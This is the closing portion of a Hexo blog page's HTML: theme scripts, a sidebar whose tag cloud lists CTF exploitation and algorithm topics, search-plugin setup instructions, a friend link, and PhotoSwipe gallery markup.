e=document.querySelector("#js-aboutme");e&&0!==e.length&&(e.innerHTML=e.innerText)}t.exports={init:e}},,,,,,,,,function(t,n){function e(t,n){if("string"==typeof n)return t.insertAdjacentHTML("afterend",n);var e=t.nextSibling;return e?t.parentNode.insertBefore(n,e):t.parentNode.appendChild(n)}t.exports=e}])</script><script src="/./main.2d7529.js"></script><script>!function(){var e=function(e){var t=document.createElement("script");document.getElementsByTagName("body")[0].appendChild(t),t.setAttribute("src",e)};e("/slider.885efe.js")}()</script>


    
<div class="tools-col" q-class="show:isShow,hide:isShow|isFalse" q-on="click:stop(e)">
  <div class="tools-nav header-menu">
    
    
      
      
      
    
      
      
      
    
      
      
      
    
    

    <ul style="width: 70%">
    
    
      
      <li style="width: 33.333333333333336%" q-on="click: openSlider(e, 'innerArchive')"><a href="javascript:void(0)" q-class="active:innerArchive">所有文章</a></li>
      
        
      
      <li style="width: 33.333333333333336%" q-on="click: openSlider(e, 'friends')"><a href="javascript:void(0)" q-class="active:friends">友链</a></li>
      
        
      
      <li style="width: 33.333333333333336%" q-on="click: openSlider(e, 'aboutme')"><a href="javascript:void(0)" q-class="active:aboutme">关于我</a></li>
      
        
    </ul>
  </div>
  <div class="tools-wrap">
    
    	<section class="tools-section tools-section-all" q-show="innerArchive">
        <div class="search-wrap">
          <input class="search-ipt" q-model="search" type="text" placeholder="find something…">
          <i class="icon-search icon" q-show="search|isEmptyStr"></i>
          <i class="icon-close icon" q-show="search|isNotEmptyStr" q-on="click:clearChose(e)"></i>
        </div>
        <div class="widget tagcloud search-tag">
          <p class="search-tag-wording">tag:</p>
          <label class="search-switch">
            <input type="checkbox" q-on="click:toggleTag(e)" q-attr="checked:showTags">
          </label>
          <ul class="article-tag-list" q-show="showTags">
             
              <li class="article-tag-list-item">
                <a href="javascript:void(0)" class="js-tag color4">PWN</a>
              </li>
             
              <li class="article-tag-list-item">
                <a href="javascript:void(0)" class="js-tag color2">pwndbg</a>
              </li>
             
              <li class="article-tag-list-item">
                <a href="javascript:void(0)" class="js-tag color4">ida</a>
              </li>
             
              <li class="article-tag-list-item">
                <a href="javascript:void(0)" class="js-tag color3">writeup</a>
              </li>
             
              <li class="article-tag-list-item">
                <a href="javascript:void(0)" class="js-tag color4">STL</a>
              </li>
             
              <li class="article-tag-list-item">
                <a href="javascript:void(0)" class="js-tag color4">CVE</a>
              </li>
             
              <li class="article-tag-list-item">
                <a href="javascript:void(0)" class="js-tag color4">Win</a>
              </li>
             
              <li class="article-tag-list-item">
                <a href="javascript:void(0)" class="js-tag color3">ML</a>
              </li>
             
              <li class="article-tag-list-item">
                <a href="javascript:void(0)" class="js-tag color5">GPLT</a>
              </li>
             
              <li class="article-tag-list-item">
                <a href="javascript:void(0)" class="js-tag color1">Metasploit</a>
              </li>
             
              <li class="article-tag-list-item">
                <a href="javascript:void(0)" class="js-tag color4">PAT</a>
              </li>
             
              <li class="article-tag-list-item">
                <a href="javascript:void(0)" class="js-tag color4">POJ</a>
              </li>
             
              <li class="article-tag-list-item">
                <a href="javascript:void(0)" class="js-tag color3">sandbox</a>
              </li>
             
              <li class="article-tag-list-item">
                <a href="javascript:void(0)" class="js-tag color5">FILE</a>
              </li>
             
              <li class="article-tag-list-item">
                <a href="javascript:void(0)" class="js-tag color3">Qt</a>
              </li>
             
              <li class="article-tag-list-item">
                <a href="javascript:void(0)" class="js-tag color1">C/C++</a>
              </li>
             
              <li class="article-tag-list-item">
                <a href="javascript:void(0)" class="js-tag color5">动态规划</a>
              </li>
             
              <li class="article-tag-list-item">
                <a href="javascript:void(0)" class="js-tag color4">UVa</a>
              </li>
             
              <li class="article-tag-list-item">
                <a href="javascript:void(0)" class="js-tag color3">贪心</a>
              </li>
             
              <li class="article-tag-list-item">
                <a href="javascript:void(0)" class="js-tag color1">中途相遇法</a>
              </li>
             
              <li class="article-tag-list-item">
                <a href="javascript:void(0)" class="js-tag color5">滑动窗口</a>
              </li>
             
              <li class="article-tag-list-item">
                <a href="javascript:void(0)" class="js-tag color4">构造法</a>
              </li>
             
              <li class="article-tag-list-item">
                <a href="javascript:void(0)" class="js-tag color5">heap</a>
              </li>
             
              <li class="article-tag-list-item">
                <a href="javascript:void(0)" class="js-tag color3">libheap</a>
              </li>
             
              <li class="article-tag-list-item">
                <a href="javascript:void(0)" class="js-tag color1">stack</a>
              </li>
             
              <li class="article-tag-list-item">
                <a href="javascript:void(0)" class="js-tag color4">ret2dlresolve</a>
              </li>
             
              <li class="article-tag-list-item">
                <a href="javascript:void(0)" class="js-tag color5">life</a>
              </li>
             
              <li class="article-tag-list-item">
                <a href="javascript:void(0)" class="js-tag color5">算法概述</a>
              </li>
            
            <div class="clearfix"></div>
          </ul>
        </div>
        <ul class="search-ul">
          <p q-show="jsonFail" style="padding: 20px; font-size: 12px;">
            缺失模块。<br/>1、在博客根目录（注意不是yilia根目录）执行以下命令：<br/> npm i hexo-generator-json-content --save<br/><br/>
            2、在根目录_config.yml里添加配置：
<pre style="font-size: 12px;" q-show="jsonFail">
  jsonContent:
    meta: false
    pages: false
    posts:
      title: true
      date: true
      path: true
      text: true
      raw: false
      content: false
      slug: false
      updated: false
      comments: false
      link: false
      permalink: false
      excerpt: false
      categories: false
      tags: true
</pre>
          </p>
          <li class="search-li" q-repeat="items" q-show="isShow">
            <a q-attr="href:path|urlformat" class="search-title"><i class="icon-quo-left icon"></i><span q-text="title"></span></a>
            <p class="search-time">
              <i class="icon-calendar icon"></i>
              <span q-text="date|dateformat"></span>
            </p>
            <p class="search-tag">
              <i class="icon-price-tags icon"></i>
              <span q-repeat="tags" q-on="click:choseTag(e, name)" q-text="name|tagformat"></span>
            </p>
          </li>
        </ul>
    	</section>
    

    
    	<section class="tools-section tools-section-friends" q-show="friends">
  		
        <ul class="search-ul">
          
            <li class="search-li">
              <a href="http://www.reehy.cn/" target="_blank" class="search-title"><i class="icon-quo-left icon"></i>Ree的墓碑</a>
            </li>
          
        </ul>
  		
    	</section>
    

    
    	<section class="tools-section tools-section-me" q-show="aboutme">
  	  	
  	  		<div class="aboutme-wrap" id="js-aboutme">Send you a bullet.&lt;br&gt;&lt;br&gt;Face fear of life bravely.</div>
  	  	
    	</section>
    
  </div>
  
</div>
    <!-- Root element of PhotoSwipe. Must have class pswp. -->
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    <!-- Background of PhotoSwipe. 
         It's a separate element as animating opacity is faster than rgba(). -->
    <div class="pswp__bg"></div>

    <!-- Slides wrapper with overflow:hidden. -->
    <div class="pswp__scroll-wrap">

        <!-- Container that holds slides. 
            PhotoSwipe keeps only 3 of them in the DOM to save memory.
            Don't modify these 3 pswp__item elements, data is added later on. -->
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                <!--  Controls are self-explanatory. Order can be changed. -->

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
                <!-- element will get class pswp__preloader--active when preloader is running -->
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                      <div class="pswp__preloader__cut">
                        <div class="pswp__preloader__donut"></div>
                      </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div> 
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div>
  </div>
</body>
</html>